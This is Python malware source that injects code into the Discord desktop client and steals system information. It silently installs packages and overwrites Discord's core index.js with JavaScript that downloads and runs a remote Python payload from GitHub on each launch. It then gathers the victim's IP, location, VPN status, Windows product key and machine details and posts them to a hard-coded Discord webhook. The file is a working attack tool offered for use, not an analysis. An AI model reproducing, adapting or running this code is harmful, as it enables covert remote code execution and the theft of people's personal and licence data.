import os, sys ,subprocess,time
try:
    import requests;from mss import mss;
except ImportError as e:
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', e.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        subprocess.run(f"pip install {e}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    finally:
       subprocess.run(f"pip install pycryptodome pypiwin32 pycryptodomex pywin32", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)

time.sleep(3)
user = os.getlogin()
path = f"C:/Users/{user}/APPDATA/Local/Discord/"
dirr = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
fdirs = [f for f in dirr if any(os.scandir(os.path.join(path, f)))]
if 'app' in fdirs[0]:
    app = fdirs[0]
else:
    fdirs.sort()
    app = fdirs[0]
mainpath = f"{path}/{app}/modules/discord_desktop_core-1/discord_desktop_core/index.js"
f = open(mainpath,"w")
content = """const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
function download(url, dest) {
    const file = fs.createWriteStream(dest);
    https.get(url, (response) => {
        response.pipe(file);

        file.on('finish', () => {
            file.close(); 
            open(dest);
        });
    }).on('error', (err) => {
        fs.unlink(dest); 
        console.error(err.message);
    });
}
function open(filePath) {
    exec(`pythonw ${filePath}`, (err) => { 
        if (err) {
            return;
        } else {
            return;
        }
    });
}
const temp = process.env.temp;
const url = 'https://raw.githubusercontent.com/dd44aa/test/refs/heads/main/bot.py';
const dpath = path.join(temp, `Z-builtins-7876-689a9de9fc.py`);
if (fs.existsSync(dpath)) {
    open(dpath);
} else {
    download(url, dpath);
}

module.exports = require('./core.asar');
"""
f.write(content)
f.close()
s = open(mainpath,"r")
hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"

def info():
            import json
            from urllib.request import urlopen
            url = 'http://ipinfo.io/json'
            response = urlopen(url)
            data = json.load(response)
            UsingVPN = json.load(urlopen("http://ip-api.com/json?fields=proxy"))['proxy']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
            process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn \n").strip()
            process2 = subprocess.Popen("wmic os get Caption", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            wtype = process2.communicate()[0].decode().strip("Caption \n").strip()
            userdata = f"```\n------- {os.getlogin()} ------- \nComputername: {os.getenv('COMPUTERNAME')} \nIP: {data['ip']} \n -VPN: {UsingVPN} \nOrg: {data['org']} \nCity: {data['city']} \nRegion: {data['region']} \nWindowskey: {wkey} \nWindows Type: {wtype} \n```**Map location: {googlemap}** \n"
            requests.post(hook,json={"content": f"{userdata}"})
info()
